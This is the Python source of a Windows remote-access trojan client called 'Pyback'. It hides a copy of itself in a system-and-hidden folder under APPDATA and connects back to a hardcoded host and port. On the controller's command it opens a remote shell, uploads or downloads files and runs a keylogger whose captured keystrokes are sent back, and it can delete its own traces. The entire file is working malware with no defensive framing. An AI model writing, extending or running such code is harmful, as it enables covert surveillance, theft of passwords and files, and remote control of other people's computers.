# import the required modules
import os
import shutil
import socket
import struct
import subprocess
import sys
import time
from threading import Thread

from pynput.keyboard import Listener

HOST = '127.0.0.1'
PORT = 51025


class Client:  # class Client: define the client properties
    def __init__(self, sock=None):
        self.sock = sock

    def send(self, data):  # custom send function
        pkt = struct.pack('>I', len(data)) + data
        self.sock.sendall(pkt)

    def recv(self):  # custom recv function
        pktlen = self.recvall(4)
        if not pktlen:
            return ""
        pktlen = struct.unpack('>I', pktlen)[0]
        return self.recvall(pktlen)

    def recvall(self, n):  # format the receipts packets
        packet = b''
        while len(packet) < n:
            frame = self.sock.recv(n - len(packet))
            if not frame:
                return None
            packet += frame
        return packet


class Exploit(Client):
    def __init__(self, sock):
        self.key_log = False
        self.sock = sock
        super().__init__(sock)

    @staticmethod
    def remove():  # remove all the files from client and delete the reg key
        path = f'{os.environ["APPDATA"]}\\Pyback'
        command = f"timeout /T 5 & del /Q /S {path} & rmdir {path}"
        subprocess.Popen(command)
        sys.exit(0)

    def upload(self):  # upload command: upload a file to the client
        file_content = self.recv()
        file_name = self.recv()
        with open(file_name, "wb") as file:
            file.write(file_content)

    def download(self):  # download command: download a file from the client
        print("download")
        local_path = self.recv().decode()
        with open(local_path, 'rb') as file:
            while True:
                a = file.read(1024)
                if not a:
                    break
                self.send(a)
        self.send(local_path.split('/')[-1].encode())

    def cmd(self):  # cmd command: open a shell on the client machine
        while True:
            directory = os.getcwd() + '>'
            self.send(directory.encode())
            cmd = self.recv().decode()
            if cmd[0:2] == 'cd':
                try:
                    os.chdir(''.join(cmd[3:]))
                    output = ''.encode()
                except FileNotFoundError:
                    output = "File or directory not found!"
            elif cmd == 'exit':
                break
            else:
                shell = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
                                         stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                output = shell.stdout.read() + shell.stderr.read()
            self.send(bytes(output))

    def keylogger(self, option):
        if option == 'start':
            Thread(target=self.key_start).start()
        elif option == 'stop':
            self.key_stop()

    def key_start(self):  # start a keylogger
        self.key_log = True

        def on_press(key):
            try:
                key = str(key).replace("'", "")
            except AttributeError:
                key = str(key).replace("'", "")
                if key == "Key.space":
                    key = ' '
                elif key == "Key.enter":
                    key = '\n'
                elif key == "Key.ctrl_l":
                    key = '[CTRL]'
                elif key == "Key.backspace":
                    key = '[BACK]'
                elif key == "Key.tabulation":
                    key = '[TAB]'
                else:
                    key = '[KEY]'
            with open("keylogs.txt", "a") as file:
                file.write(str(key))

        def on_release(key):
            return self.key_log

        with Listener(on_press=on_press, on_release=on_release) as listen:
            listen.join()

    def key_stop(self):  # stop the keylogger and send the file to the server
        self.key_log = False
        with open('keylogs.txt', 'rb') as file:
            while True:
                a = file.read(1024)
                if not a:
                    break
                self.send(a)
        os.remove('keylogs.txt')


def background():  # connect to the server and retry all 10 seconds
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    time.sleep(20)
    while True:
        try:
            sock.connect((HOST, PORT))
            break
        except ConnectionRefusedError or ConnectionAbortedError:
            time.sleep(10)
    interpreter(sock)


def interpreter(sock):  # wait for commands from the server and interpret them
    exploit = Exploit(sock)
    while True:
        string = Client(sock).recv().decode()
        command = string.split()[0]
        if command == 'exit':
            exit()
        elif command == 'remove':
            exploit.remove()
        elif command == 'background':
            background()
        elif command == 'cmd':
            exploit.cmd()
        elif command == 'upload':
            exploit.upload()
        elif command == 'download':
            exploit.download()
        elif command == 'keylogger':
            exploit.keylogger(string.split()[1])


def setup(path):  # set up the folder for client an automated startup
    os.mkdir(path)
    file = os.path.realpath(sys.argv[0])
    file_name = file.split("\\")[-1]
    shutil.copy(file, path)
    file_path = path + "\\" + file_name
    subprocess.Popen(f'attrib +s +h +i +x +u {path}', shell=True)
    os.chdir(path)
    subprocess.check_output(["cmd", "/c", "start", file_path])
    sys.exit(0)


def main():
    path = f'{os.environ["APPDATA"]}\\Pyback'
    if os.path.isdir(path) and os.getcwd() == path:
        background()
    elif os.path.isdir(path):
        sys.exit()
    else:
        setup(path)


while True:
    main()
